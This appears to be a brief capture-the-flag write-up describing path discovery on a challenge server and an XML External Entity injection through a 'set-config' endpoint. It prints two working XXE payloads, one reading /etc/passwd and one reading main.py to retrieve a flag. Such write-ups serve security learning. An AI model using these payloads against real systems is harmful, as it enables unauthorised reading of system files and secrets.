Try out several subpath found the following is valid

* [1] http://34.74.105.127/a89232cf07/unlock
* [2] http://34.74.105.127/a89232cf07/admin

``[2]`` leads to admin panel

There is a comment in admin page indicates a path named 'get-config'
By checking

```html
  http://34.74.105.127/a89232cf07/get-config
```

We found it leads to a page shows 
  'Front door'
same string at admin panel

View the source code of get-config, turns out it's actually an XML file.
looks like there are some logic to read the xml file and generate the admin page.

Test url

```html
  http://34.74.105.127/a89232cf07/set-config
```

Got a ``Bad Request`` message which means this is a valid path.

Try to request with parameter 'data' and payload

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mycode [<!ELEMENT config ANY ><!ENTITY mycode SYSTEM "/etc/passwd" >]><config><location>&mycode;</location></config>
```

It redirect to admin page with content of /etc/passwd.

Try out several paths, seems ``main.py`` is a valid one.

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mycode [<!ELEMENT config ANY ><!ENTITY mycode SYSTEM "main.py" >]><config><location>&mycode;</location></config>
```

Found one flag in file main.py.
